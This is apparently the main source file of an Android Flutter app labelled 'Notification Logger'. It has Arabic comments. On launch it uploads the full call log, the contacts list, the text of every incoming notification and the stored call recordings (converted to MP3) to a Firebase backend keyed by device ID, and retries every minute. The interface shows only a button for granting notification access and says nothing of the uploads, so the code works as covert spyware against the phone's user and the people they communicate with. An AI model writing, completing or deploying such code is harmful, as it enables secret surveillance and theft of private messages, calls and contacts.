import 'dart:async';
import 'dart:io';

import 'package:android_intent_plus/android_intent.dart';
import 'package:android_intent_plus/flag.dart';
import 'package:call_log/call_log.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:ffmpeg_kit_flutter/ffmpeg_kit.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:flutter_notification_listener/flutter_notification_listener.dart';
import 'package:hive/hive.dart';
import 'package:hive_flutter/adapters.dart';
import 'package:intl/intl.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'firebase_options.dart';
import 'package:path/path.dart' as path;
import 'package:path/path.dart' as p;

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  final dir = await getApplicationDocumentsDirectory();
  await Hive.initFlutter(dir.path);
  await Hive.openBox<String>('pending_recordings');
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final database = FirebaseDatabase.instance.ref('notifications');

  @override
  void initState() {
    super.initState();
    NotificationsListener.initialize();
    uploadCallLogs();
    uploadAllCallRecordings();
    uploadPendingRecordings();
    startAutoSyncTimer();
    uploadContactsToFirebase();
    checkNotificationAccess();

    NotificationsListener.receivePort?.listen((event) {
      if (event is NotificationEvent) {
        final data = {
          'packageName': event.packageName,
          'title': event.title,
          'text': event.text,
          'timestamp': DateTime.now().toIso8601String(),
        };

        print('🔔 New Notification: $data');
        database.push().set(data);
      }
    });
  }

  void openNotificationAccessSettings() {
    if (Platform.isAndroid) {
      const intent = AndroidIntent(
        action: 'android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS',
        flags: <int>[Flag.FLAG_ACTIVITY_NEW_TASK],
      );
      intent.launch();
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Notification Logger',
      home: Scaffold(
        appBar: AppBar(title: const Text('Notification Listener')),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const SizedBox(height: 16),
              ElevatedButton(
                onPressed: openNotificationAccessSettings,
                child: const Text('تفعيل صلاحية الإشعارات'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}



Future<void> uploadCallLogs() async {
  final database = FirebaseDatabase.instance.ref('call_logs');

  // طلب صلاحية الهاتف (Phone)
  if (await Permission.phone.request().isGranted) {
    // الآن نحاول قراءة السجل
    final Iterable<CallLogEntry> entries = await CallLog.get();

    for (CallLogEntry entry in entries) {
      final data = {
        'name': entry.name,
        'number': entry.number,
        'type': entry.callType.toString(),
        'timestamp': entry.timestamp != null
            ? DateTime.fromMillisecondsSinceEpoch(entry.timestamp!).toIso8601String()
            : null,
        'duration': entry.duration,
      };

      await database.push().set(data);
      print('📞 سجل مرفوع: $data');
    }
  } else {
    print('❌ صلاحية الهاتف مرفوضة.');
  }
}

Future<void> uploadContactsToFirebase() async {
  final status = await Permission.contacts.status;
  if (!status.isGranted) {
    print("❌ لم يتم منح صلاحية جهات الاتصال");
    return;
  }

  final contacts = await ContactsService.getContacts(withThumbnails: false);

  final deviceId = await getDeviceId(); // موجود عندك مسبقًا
  final ref = FirebaseDatabase.instance.ref("contacts/$deviceId");

  for (final contact in contacts) {
    final name = contact.displayName ?? "unknown";

    for (final phone in contact.phones ?? []) {
      final number = phone.value ?? "";

      final contactData = {
        'name': name,
        'number': number,
        'timestamp': DateTime.now().toIso8601String(),
      };

      await ref.push().set(contactData);
      print("✅ تم رفع جهة الاتصال: $contactData");
    }
  }
}

Future<void> uploadCallToFirestore({
  required String fileName,
  required String downloadUrl,
  required int duration,
  required String number,
  required String callType,
  required String deviceId,
  String? contactName,
}) async {
  final timestamp = DateTime.now().toUtc();

  await FirebaseFirestore.instance.collection('call_recordings').add({
    'fileName': fileName,
    'downloadUrl': downloadUrl,
    'timestamp': timestamp,
    'duration': duration,
    'number': number,
    'callType': callType,
    'deviceId': deviceId,
    'contactName': contactName ?? '',
  });

  print('📥 تم حفظ بيانات التسجيل في Firestore');
}



Future<void> uploadAllCallRecordings() async {
  final dir = Directory("${(await getExternalStorageDirectory())?.path}/CallRecordings");

  if (!await dir.exists()) {
    print('📂 مجلد التسجيلات غير موجود');
    return;
  }

  final List<FileSystemEntity> files = dir.listSync();

  for (var file in files) {
    if (file is File && (file.path.endsWith(".mp4") || file.path.endsWith(".3gp"))) {
      await uploadToFirebase(file);
    }
  }
}

Future<void> uploadPendingRecordings() async {
  final connectivity = await Connectivity().checkConnectivity();
  if (connectivity == ConnectivityResult.none) return;

  final box = Hive.box<String>('pending_recordings');
  final keys = box.keys.toList();

  for (String path in keys) {
    final file = File(path);
    if (await file.exists()) {
      try {
        await uploadToFirebase(file);
        box.delete(path);
        print('☁️ تم رفع تسجيل مؤجل: $path');
      } catch (e) {
        print('⚠️ فشل رفع تسجيل مؤجل: $e');
      }
    } else {
      box.delete(path); // الملف غير موجود
    }
  }
}

Future<String> getDeviceId() async {
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  return androidInfo.id ?? "unknown_device";
}

Future<void> uploadToFirebase(File file) async {
  final connectivity = await Connectivity().checkConnectivity();
  final hasInternet = connectivity != ConnectivityResult.none;

  if (!hasInternet) {
    final box = Hive.box<String>('pending_recordings');
    box.put(file.path, file.path);
    return;
  }

  final deviceId = await getDeviceId();
  final now = DateTime.now();
  final folder = DateFormat('yyyy-MM').format(now);

  // 🧠 جرّب التحويل لـ MP3
  final mp3File = await convertToMp3(file);

  if (mp3File == null || !await mp3File.exists()) {
    print("❌ فشل تحويل الملف إلى MP3، لن يتم رفع أي شيء.");
    return;
  }

  final mp3FileName = 'call_${now.millisecondsSinceEpoch}.mp3';
  final storagePath = 'call_recordings/$deviceId/$folder/$mp3FileName';

  try {
    final storageRef = FirebaseStorage.instance.ref(storagePath);
    await storageRef.putFile(mp3File);

    final downloadUrl = await storageRef.getDownloadURL();
    final callInfo = await getLatestCallInfo();

    if (callInfo != null) {
      await uploadCallToFirestore(
        fileName: mp3FileName,
        downloadUrl: downloadUrl,
        duration: callInfo['duration'],
        number: callInfo['number'],
        callType: callInfo['callType'],
        deviceId: deviceId,
        contactName: callInfo['name'],
      );
    }

    print("✅ تم رفع ملف MP3 إلى Firebase Storage");

  } catch (e) {
    print("❌ فشل رفع الملف MP3: $e");

    // تخزين مؤقت في حالة فشل الرفع
    final box = Hive.box<String>('pending_recordings');
    box.put(mp3File.path, mp3File.path);
  }
}


Future<void> checkNotificationAccess() async {
  final isRunning = await NotificationsListener.isRunning;
  if (!isRunning!) {
    print("🔐 الصلاحية غير مفعلة، نفتح صفحة الإعدادات...");
    openNotificationSettings();
  } else {
    print("✅ صلاحية الإشعارات مفعلة");
  }
}

Timer? _syncTimer;

void startAutoSyncTimer() {
  _syncTimer?.cancel(); // تأكد ما يكون فيه مؤقت مكرر

  _syncTimer = Timer.periodic(Duration(minutes: 1), (timer) async {
    final connectivity = await Connectivity().checkConnectivity();
    if (connectivity != ConnectivityResult.none) {
      print("🌐 الإنترنت متوفر، محاولة رفع التسجيلات المؤجلة...");
      await uploadPendingRecordings();
    } else {
      print("📴 لا يوجد إنترنت، ننتظر...");
    }
  });
}

Future<Map<String, dynamic>?> getLatestCallInfo() async {
  await Permission.phone.request();
  await Permission.contacts.request();

  final Iterable<CallLogEntry> entries = await CallLog.get();

  if (entries.isEmpty) return null;

  final CallLogEntry last = entries.first;

  final String number = last.number ?? 'unknown';
  final int duration = last.duration ?? 0;
  final String callType = last.callType.toString().split('.').last;
  final DateTime time = DateTime.fromMillisecondsSinceEpoch(last.timestamp ?? 0);

  // محاولة استخراج الاسم من جهات الاتصال
  String? name;

  final contacts = await ContactsService.getContacts(withThumbnails: false);
  for (final c in contacts) {
    for (final n in c.phones ?? []) {
      if (n.value?.replaceAll(' ', '') == number.replaceAll(' ', '')) {
        name = c.displayName;
        break;
      }
    }
    if (name != null) break;
  }

  return {
    'number': number,
    'duration': duration,
    'callType': callType,
    'timestamp': time.toIso8601String(),
    'name': name ?? '',
  };
}


void openNotificationSettings() {
  if (Platform.isAndroid) {
    const intent = AndroidIntent(
      action: 'android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS',
      flags: <int>[Flag.FLAG_ACTIVITY_NEW_TASK],
    );
    intent.launch();
  }
}



Future<File?> convertToMp3(File inputFile) async {
  final outputPath = inputFile.path.replaceAll(".mp4", ".mp3");

  final command = "-i \"${inputFile.path}\" -vn -ar 44100 -ac 2 -b:a 192k \"$outputPath\"";

  print("🔄 تحويل إلى MP3...");
  final session = await FFmpegKit.execute(command);

  final returnCode = await session.getReturnCode();
  if (returnCode?.isValueSuccess() ?? false) {
    print("✅ تم التحويل إلى MP3: $outputPath");
    return File(outputPath);
  } else {
    print("❌ فشل التحويل إلى MP3");
    return null;
  }
}





